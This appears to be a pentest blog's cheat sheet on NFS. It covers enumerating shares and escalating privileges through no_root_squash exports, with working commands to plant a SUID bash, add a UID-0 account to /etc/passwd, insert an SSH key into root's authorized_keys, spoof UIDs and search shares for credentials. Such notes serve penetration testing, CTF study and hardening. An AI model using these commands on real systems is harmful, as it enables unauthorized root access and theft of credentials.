@@ -1,0 +1,337 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="NFS-Port-111-2049"><a href="#NFS-Port-111-2049" class="headerlink" title="NFS (Port 111, 2049)"></a>NFS (Port 111, 2049)</h1><p>Enumerate and exploit Network File System (NFS) shares to access remote file systems and escalate privileges.<br>NFS allows mounting remote directories over the network, commonly used in Unix&#x2F;Linux environments for file sharing.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><h3 id="Show-Available-Shares"><a href="#Show-Available-Shares" class="headerlink" title="Show Available Shares"></a>Show Available Shares</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mount-NFS-Share"><a href="#Mount-NFS-Share" class="headerlink" title="Mount NFS Share"></a>Mount NFS Share</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /mnt/nfs</span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-Scripts"><a href="#Nmap-Scripts" class="headerlink" title="Nmap Scripts"></a>Nmap Scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NFS enumeration</span></span><br><span class="line">nmap -p111,2049 --script nfs-* 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># RPC info (includes NFS)</span></span><br><span class="line">nmap -p111 --script rpcinfo 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># NFS shares</span></span><br><span class="line">nmap -p111 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="showmount"><a href="#showmount" class="headerlink" title="showmount"></a>showmount</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show available NFS exports</span></span><br><span class="line">showmount -e 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show all mount points</span></span><br><span class="line">showmount -a 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show directories</span></span><br><span class="line">showmount -d 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="rpcinfo"><a href="#rpcinfo" class="headerlink" title="rpcinfo"></a>rpcinfo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List RPC services</span></span><br><span class="line">rpcinfo -p 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Query specific service</span></span><br><span class="line">rpcinfo -s 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mounting-NFS-Shares"><a href="#Mounting-NFS-Shares" class="headerlink" title="Mounting NFS Shares"></a>Mounting NFS Shares</h2><h3 id="Basic-Mount"><a href="#Basic-Mount" class="headerlink" title="Basic Mount"></a>Basic Mount</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create mount point</span></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount NFS share</span></span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount with specific NFS version</span></span><br><span class="line">mount -t nfs -o vers=3,nolock 10.10.10.10:/share /mnt/nfs</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mount-Options"><a href="#Mount-Options" class="headerlink" title="Mount Options"></a>Mount Options</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Read-only mount</span></span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock,ro</span><br><span class="line"></span><br><span class="line"><span class="comment"># Soft mount (timeout on failure)</span></span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock,soft</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify port</span></span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock,port=2049</span><br></pre></td></tr></table></figure>
+
+<h3 id="Unmount"><a href="#Unmount" class="headerlink" title="Unmount"></a>Unmount</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Unmount NFS share</span></span><br><span class="line">umount /mnt/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Force unmount</span></span><br><span class="line">umount -f /mnt/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lazy unmount</span></span><br><span class="line">umount -l /mnt/nfs</span><br></pre></td></tr></table></figure>
+
+<h2 id="Privilege-Escalation-via-NFS"><a href="#Privilege-Escalation-via-NFS" class="headerlink" title="Privilege Escalation via NFS"></a>Privilege Escalation via NFS</h2><h3 id="no-root-squash-Exploitation"><a href="#no-root-squash-Exploitation" class="headerlink" title="no_root_squash Exploitation"></a>no_root_squash Exploitation</h3><h4 id="Check-for-no-root-squash"><a href="#Check-for-no-root-squash" class="headerlink" title="Check for no_root_squash"></a>Check for no_root_squash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On target, check /etc/exports</span></span><br><span class="line"><span class="built_in">cat</span> /etc/exports</span><br><span class="line"></span><br><span class="line"><span class="comment"># Look for no_root_squash option</span></span><br><span class="line">/share *(rw,no_root_squash,insecure)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploit-no-root-squash"><a href="#Exploit-no-root-squash" class="headerlink" title="Exploit no_root_squash"></a>Exploit no_root_squash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On attacker machine (as root)</span></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/nfs</span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create SUID binary</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /mnt/nfs/bash</span><br><span class="line"><span class="built_in">chmod</span> +s /mnt/nfs/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># On target machine</span></span><br><span class="line">/share/bash -p</span><br></pre></td></tr></table></figure>
+
+<h4 id="Alternative-Create-Root-User"><a href="#Alternative-Create-Root-User" class="headerlink" title="Alternative: Create Root User"></a>Alternative: Create Root User</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On attacker (as root)</span></span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create malicious passwd entry</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;root2:x:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /mnt/nfs/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or add SSH key</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/nfs/root/.ssh</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; /mnt/nfs/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<h3 id="UID-GID-Manipulation"><a href="#UID-GID-Manipulation" class="headerlink" title="UID&#x2F;GID Manipulation"></a>UID&#x2F;GID Manipulation</h3><h4 id="List-Files-with-UIDs"><a href="#List-Files-with-UIDs" class="headerlink" title="List Files with UIDs"></a>List Files with UIDs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List with numeric UIDs/GIDs</span></span><br><span class="line"><span class="built_in">ls</span> -n /mnt/nfs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example output:</span></span><br><span class="line"><span class="comment"># -rw-r--r-- 1 1000 1000 1221 Sep 19 18:21 file.txt</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Match-UID-GID"><a href="#Match-UID-GID" class="headerlink" title="Match UID&#x2F;GID"></a>Match UID&#x2F;GID</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create user with matching UID</span></span><br><span class="line">useradd -u 1000 tempuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Switch to that user</span></span><br><span class="line">su tempuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access files</span></span><br><span class="line"><span class="built_in">cat</span> /mnt/nfs/file.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Configuration-File"><a href="#Configuration-File" class="headerlink" title="Configuration File"></a>Configuration File</h2><h3 id="etc-exports-Format"><a href="#etc-exports-Format" class="headerlink" title="&#x2F;etc&#x2F;exports Format"></a>&#x2F;etc&#x2F;exports Format</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># View exports configuration</span></span><br><span class="line"><span class="built_in">cat</span> /etc/exports</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example entries:</span></span><br><span class="line">/share 10.10.10.0/24(rw,<span class="built_in">sync</span>,no_subtree_check)</span><br><span class="line">/data *(ro,all_squash)</span><br><span class="line">/backup 10.10.10.5(rw,no_root_squash,insecure)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Dangerous-Settings"><a href="#Dangerous-Settings" class="headerlink" title="Dangerous Settings"></a>Dangerous Settings</h2><h3 id="Export-Options"><a href="#Export-Options" class="headerlink" title="Export Options"></a>Export Options</h3><table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>rw</code></td>
+<td>Read and write permissions</td>
+</tr>
+<tr>
+<td><code>ro</code></td>
+<td>Read-only permissions</td>
+</tr>
+<tr>
+<td><code>no_root_squash</code></td>
+<td>Root on client has root privileges on share (dangerous!)</td>
+</tr>
+<tr>
+<td><code>root_squash</code></td>
+<td>Map root UID to anonymous UID (default, safer)</td>
+</tr>
+<tr>
+<td><code>all_squash</code></td>
+<td>Map all UIDs to anonymous UID</td>
+</tr>
+<tr>
+<td><code>insecure</code></td>
+<td>Allow connections from ports above 1024</td>
+</tr>
+<tr>
+<td><code>nohide</code></td>
+<td>Export subdirectories independently</td>
+</tr>
+<tr>
+<td><code>sync</code></td>
+<td>Write changes to disk before responding</td>
+</tr>
+<tr>
+<td><code>async</code></td>
+<td>Write changes asynchronously (faster but risky)</td>
+</tr>
+</tbody></table>
+<h2 id="Metasploit-Modules"><a href="#Metasploit-Modules" class="headerlink" title="Metasploit Modules"></a>Metasploit Modules</h2><h3 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NFS share scanner</span></span><br><span class="line">use auxiliary/scanner/nfs/nfsmount</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><h3 id="Full-NFS-Enumeration-and-Exploitation"><a href="#Full-NFS-Enumeration-and-Exploitation" class="headerlink" title="Full NFS Enumeration and Exploitation"></a>Full NFS Enumeration and Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. Discover NFS service</span></span><br><span class="line">nmap -p111,2049 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Enumerate shares</span></span><br><span class="line">showmount -e 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Mount share</span></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/nfs</span><br><span class="line">mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. List contents with UIDs</span></span><br><span class="line"><span class="built_in">ls</span> -la /mnt/nfs/</span><br><span class="line"><span class="built_in">ls</span> -n /mnt/nfs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. Check for sensitive files</span></span><br><span class="line">find /mnt/nfs/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o -name <span class="string">&quot;*.conf&quot;</span> -o -name <span class="string">&quot;*.key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. Search for credentials</span></span><br><span class="line">grep -r <span class="string">&quot;password&quot;</span> /mnt/nfs/ 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. If no_root_squash, create SUID binary</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /mnt/nfs/bash</span><br><span class="line"><span class="built_in">chmod</span> +s /mnt/nfs/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. Cleanup</span></span><br><span class="line">umount /mnt/nfs</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>no_root_squash Exploitation:</strong></p>
+<ul>
+<li>Most dangerous NFS misconfiguration</li>
+<li>Allows root on client to have root privileges on share</li>
+<li>Can create SUID binaries or modify system files</li>
+<li>Default is root_squash which maps root to nobody</li>
+</ul>
+<p><strong>UID&#x2F;GID Mapping:</strong></p>
+<ul>
+<li>NFS uses numeric UIDs&#x2F;GIDs, not usernames</li>
+<li>UID 1000 on client &#x3D; UID 1000 on server</li>
+<li>Can create users with matching UIDs to access files</li>
+<li>Use <code>ls -n</code> to see numeric UIDs instead of usernames</li>
+</ul>
+<p><strong>Security Considerations:</strong></p>
+<ul>
+<li>NFS has no built-in encryption (use NFSv4 with Kerberos)</li>
+<li>Authentication based on IP address and UID&#x2F;GID</li>
+<li>Easily spoofed if not properly configured</li>
+<li>Should be restricted to trusted networks only</li>
+</ul>
+<p><strong>Common Misconfigurations:</strong></p>
+<ul>
+<li>Exporting to wildcard (*) instead of specific IPs</li>
+<li>Using no_root_squash unnecessarily</li>
+<li>Allowing insecure ports (above 1024)</li>
+<li>Not using firewalls to restrict NFS access</li>
+<li>Exporting sensitive directories</li>
+</ul>
+<p><strong>Enumeration Tips:</strong></p>
+<ul>
+<li>Check &#x2F;etc&#x2F;exports for configuration</li>
+<li>Look for no_root_squash in exports</li>
+<li>List files with <code>ls -n</code> to see UIDs</li>
+<li>Search for SSH keys, credentials, and config files</li>
+<li>Check for writable directories</li>
+<li>Look for backup files and databases</li>
+</ul>
+<p><strong>Ports:</strong></p>
+<ul>
+<li>Port 111 - RPC portmapper (used to discover NFS port)</li>
+<li>Port 2049 - NFS service (default)</li>
+<li>Additional random ports for NFS services</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
